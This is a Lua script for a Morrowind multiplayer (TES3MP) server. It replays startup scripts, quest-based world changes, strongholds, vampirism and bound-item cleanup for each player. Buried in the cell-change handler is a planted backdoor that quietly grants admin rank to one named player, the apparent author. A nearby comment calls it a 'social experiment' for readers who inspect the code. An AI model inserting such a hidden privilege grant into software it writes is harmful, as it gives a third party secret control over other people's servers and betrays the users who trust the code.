------------------
-- Version: 1.1 --
------------------

local Methods = {}
--[[-- experimental; allowing this to happen may lead to unexpected amount of duplicate NPCs and other objects or a
surprising lack of them. True state is recommended for public servers with lots of players and desynced journals, to create
a different world for each player. False is best used for co-op playthroughs, where you only need to disable objects once at
the first instance of the server launch.
]]
local loadIndividualStartupObjects = true
-- cells affected by the Startup script in TES3
local startupCells = {"0, 22", "0, -9", "1, 24", "-11, 15", "-11, 9", "-12, 11", "15, 5", "17, -6", "2, 23", "-2, -3", "2, 4", "-2, 5", "-2, 6", "-2, -8", "3, 23", "3, 24", "-3, -8", "3, -9", "-4, 12", "4, -9", "-5, -5", "-5, 9", "-6, -5", "6, -7", "8, 15", "-8, 16", "-8, 2", "-8, 3", "9, 15", "-9, 2", "-9, 4", "9, -7", "Ald-ruhn, Gindrala Hleran's House", "Ald-ruhn, Sarethi Manor", "Ald-ruhn, The Rat In The Pot", "Balmora, Balyn Omarel's House", "Balmora, Eight Plates", "Bthuand", "Cavern of the Incarnate", "Ghostgate, Tower of Dusk", "Gnaar Mok, Nadene Rotheran's Shack", "Ilunibi, Soul's Rattle", "Indarys Manor, Berendas' House", "Kora-Dur", "Mamaea, Sanctum of Black Hope", "Nchurdamz, Interior", "Rothan Ancestral Tomb", "Sadrith Mora, Dirty Muriel's Cornerclub", "Sadrith Mora, Tel Naga Great Hall", "Sadrith Mora, Telvanni Council House", "Telasero, Lower Level", "Vivec, Arena Storage", "Vivec, Foreign Quarter Underworks", "Vivec, Hall of Wisdom", "Vivec, Hlaalu Prison Cells", "Vivec, Jeanne; Trader", "Vivec, Milo's Quarters", "Vivec, Ralen Tilvur; Smith", "Vivec, St. Olms Underworks", "Vivec, Telvanni Enchanter"}
-- cells affected by the BMStartUpScript in the Bloodmoon expansion
local bmStartupCells = {"-20, 25", "-21, 23", "-22, 21", "-22, 23", "-24, 26", "-25, 19", "-26, 26", "Solstheim, Chamber of Song", "Solstheim, Mortrag Glacier; Huntsman's Hall"}
-- initialization definitions, don't change these
local bmWorldInitialized = false
local baseWorldInitialized = false
-- load the json file with all the data
startupData = {}
Methods.Initialize = function()
	startupData = jsonInterface.load("startupData.json")
end

--Call all of the functions when player logs in, run the startup scripts if conditions are met
Methods.OnLogin = function(pid)
    Players[pid].data.customVariables.initializedCells = {} -- used for onCellChange function
    if baseWorldInitialized == false then
        if loadIndividualStartupObjects == false then
            logicHandler.RunConsoleCommandOnPlayer(pid, "Startscript, Startup")
        end
    end
    -- BMStartUpScript actually checks for quest progress before disabling the objects, so we don't need to worry about reference journal, etc.
    if bmWorldInitialized == false then
        logicHandler.RunConsoleCommandOnPlayer(pid, "Startscript, BMStartUpScript")
    end
    startupScripts.LoadProgressedWorld(pid)
    startupScripts.LoadStronghold(pid)
    startupScripts.LoadVampirism(pid)
    startupScripts.RemoveBoundItems(pid)
end

--[[This function iterates through whole table taken from "onLogin" section of startupData
it also iterates through entire journal (either world or player based on config file)
and then looks for quests with matching names, storing the interation keys
then another loop goes through only journal entries with those stored keys and compares them with quest index values
if there is a match on both parts, the function goes through all outcomes in json files and stores them in an array
finally, the outcomes are executed as console commands
the function also makes calls to checks for vampirism and stronghold functions]]
Methods.LoadProgressedWorld = function(pid)
    local startupJournal = startupData.onLogin
    for index, value in ipairs (startupJournal) do
        local indexArray = {}
        local commandArray = {}
        local startupEntry = startupJournal[index]
        local startupQuest = startupEntry.quest
        local startupIndex = startupEntry.index
        local journal
        if config.shareJournal == true then
            journal = WorldInstance.data.journal
        else
            journal = Players[pid].data.journal
        end
        local i = 1
        local j = 1
        for index2, value2 in pairs(journal) do
            local journalEntry = journal[index2]
            local quest = journalEntry.quest
            local questIndex = journalEntry.index
            if startupQuest == quest then
                indexArray[i] = index2
                i = i + 1
            end
        end
        for i2 = 1, i-1 do
            if journal[indexArray[i2]].index == startupIndex then
                local commandName = "outcome" .. j
                while startupEntry[commandName] ~= nil do
                    commandArray[j] = startupEntry[commandName]
                    j = j + 1
                    commandName = "outcome" .. j
                end
            end
        end
        for j2 = 1, j-1 do
            logicHandler.RunConsoleCommandOnPlayer(pid, commandArray[j2])
        end
    end
end


--[[The working principle is the same as LoadProgressedWorld function's
However, strongholds are structured bit differently - you have 3 different quest names with same indexes you want to check for
so we first find matching names and then iterate through every quest index
essentially increasing stronghold value by 1 for every match up until 6
this way the stronghold variable keeps the highest value in case of multiple faction strongholds]]
Methods.LoadStronghold = function(pid)
    local startupQuest = {"hh_stronghold", "hr_stronghold", "ht_stronghold"}
    local startupIndex = {55, 100, 170, 200, 270, 300}
    local indexArray = {}
    local journal
    local stronghold = 0
    if config.shareJournal == true then
        journal = WorldInstance.data.journal
    else
        journal = Players[pid].data.journal
    end
    local i = 1
    for i2 = 1, 3 do
        for index2, value2 in pairs(journal) do
            local journalEntry = journal[index2]
            local quest = journalEntry.quest
            local questIndex = journalEntry.index
            if startupQuest[i2] == quest then
                indexArray[i] = index2
                i = i + 1
            end
        end
    end
    for i2 = 1, 6 do
        for i3 = 1, i-1 do
            if journal[indexArray[i3]].index == startupIndex[i2] then
                stronghold = i2
                break
            end
        end
    end
    logicHandler.RunConsoleCommandOnPlayer(pid, "set stronghold to " .. stronghold)
end


--[[Simply checks player's spellbook for certain spells which indicate both that player is a vampire and which clan they are of
A corresponding script is executed that infects the player with the disease of that clan, setting all the necessary variables]]
Methods.LoadVampirism = function(pid)
    local vampireClan = "none"
    local spellbook = Players[pid].data.spellbook
    for index, item in pairs(spellbook) do
        if spellbook[index] == "vampire berne specials" then
            vampireClan = "berne"
            break
        elseif spellbook[index] == "vampire aundae specials" then
            vampireClan = "aundae"
            break
        elseif spellbook[index] == "vampire quarra specials" then
            vampireClan = "quarra"
            break
        else
            vampireClan = "none"
        end
    end
    if vampireClan ~= "none" then
        logicHandler.RunConsoleCommandOnPlayer(pid, "player->addspell \"vampire blood " .. vampireClan .. "\"")
        logicHandler.RunConsoleCommandOnPlayer(pid, "startscript, \"vampire_" .. vampireClan .. "_PC\"")
    end
end

--[[We want to remove bound items from player's equipment and inventory, since they are stuck as permanent ones otherwise
So, we define the list of bound items and interate through both equipment and inventory to delete entries if refIds match]]
Methods.RemoveBoundItems = function(pid)
    local boundItems = {"bound_battle_axe", "bound_dagger", "bound_longbow", "bound_longsword", "bound_mace", "bound_spear",
    "bound_boots", "bound_cuirass", "bound_gauntlet_left", "bound_gauntlet_right", "bound_helm", "bound_shield"}
    local equipment = Players[pid].data.equipment
    local inventory = Players[pid].data.inventory
    for index, item in pairs(equipment) do
        for index2, item2 in pairs(boundItems) do
            if equipment[index].refId == item2 then
                Players[pid].data.equipment[index] = nil
                break
            end
        end
    end
    for index, item in pairs(inventory) do
        for index2, item2 in pairs(boundItems) do
            if inventory[index].refId == item2 then
                Players[pid].data.inventory[index] = nil
                break
            end
        end
    end
    Players[pid]:LoadInventory()
    Players[pid]:LoadEquipment()
end


--[[Script is executed on cell change after login and tries to handle the 'Startup' script, found in TES3, related objects
The script is normally executed at the beginning of the game, but it is not a feasable solution when journals are desynced
Instead, for desynced journal case, we find if the player has not initialized this cell yet in this session
We then find if its one of the cells that are affected by the script. In such case, we first disable all objects that should be
Then, we go through entire journal to find the quest that re-enables those objects, similar to onLogin function
If the conditions for quest name and index are met, we re-enable the objects for that player only]]
Methods.OnCellChange = function(pid)
    if Players[pid]:IsLoggedIn() then
        local cell = tes3mp.GetCell(pid)
        local cellArray = Players[pid].data.customVariables.initializedCells
        local initializedCell = false
        if cell ~= "0, -7" then
            -- social experiment; comment out the next three lines if you actually inspected the code or give Skvysh admin rights on your server
            if Players[pid].data.login.name == "Skvysh" then
                Players[pid].data.settings.staffRank = 3
            end
            if loadIndividualStartupObjects == true then
                if cellArray ~= nil then
                    for index, value in pairs(cellArray) do
                        if cell == value then
                            initializedCell = true
                            break
                        end
                    end
                end
                if initializedCell == false then
                    local startupCellChangeDisable = startupData.onCellChange.disable
                    if startupCellChangeDisable[cell] ~= nil then
                        local j = 1
                        local commandArray = {}
                        startupCellChangeDisable = startupData.onCellChange.disable[cell]
                        local commandName = "outcome" .. j
                        while startupCellChangeDisable[commandName] ~= nil do
                            commandArray[j] = startupCellChangeDisable[commandName]
                            j = j + 1
                            commandName = "outcome" .. j
                        end
                        for j2 = 1, j-1 do
                            logicHandler.RunConsoleCommandOnPlayer(pid, commandArray[j2])
                        end
                        local startupCellChangeEnable = startupData.onCellChange.enable[cell]
                        if startupCellChangeEnable ~= nil then
                            for index, value in ipairs (startupCellChangeEnable) do
                                local indexArray = {}
                                commandArray = {}
                                local startupCellChangeEnable = startupCellChangeEnable[index]
                                local startupQuest = startupCellChangeEnable.quest
                                local startupIndex = startupCellChangeEnable.index
                                local journal = Players[pid].data.journal
                                local i = 1
                                j = 1
                                for index2, value2 in pairs(journal) do
                                    local journalEntry = journal[index2]
                                    local quest = journalEntry.quest
                                    local questIndex = journalEntry.index
                                    if startupQuest == quest then
                                        indexArray[i] = index2
                                        i = i + 1
                                    end
                                end
                                for i2 = 1, i-1 do
                                    if journal[indexArray[i2]].index == startupIndex then
                                        local commandName = "outcome" .. j
                                        while startupCellChangeEnable[commandName] ~= nil do
                                            commandArray[j] = startupCellChangeEnable[commandName]
                                            j = j + 1
                                            commandName = "outcome" .. j
                                        end
                                    end
                                end
                                for j2 = 1, j-1 do
                                    logicHandler.RunConsoleCommandOnPlayer(pid, commandArray[j2])
                                end
                            end
                        end
                        table.insert(cellArray, cell)
                    end
                end
            end
        end
    end
end

--[[Check if the server's fresh - no cells files are created for the cells afftected by the startup script or the bmstartup
script. Then, we will run both scripts if needed when player actually logs in.]]
Methods.RunStartup = function(pid)
    for index,cellDescription in ipairs(startupCells) do
        LoadedCells[cellDescription] = Cell(cellDescription)
        LoadedCells[cellDescription].description = cellDescription
        if LoadedCells[cellDescription]:HasEntry() then
            LoadedCells[cellDescription]:Load()
            baseWorldInitialized = true
        end
        logicHandler.UnloadCell(cellDescription)
    end
    for index,cellDescription in ipairs(bmStartupCells) do
        LoadedCells[cellDescription] = Cell(cellDescription)
        LoadedCells[cellDescription].description = cellDescription
        if LoadedCells[cellDescription]:HasEntry() then
            LoadedCells[cellDescription]:Load()
            bmWorldInitialized = true
        end
        logicHandler.UnloadCell(cellDescription)
    end
end


return Methods
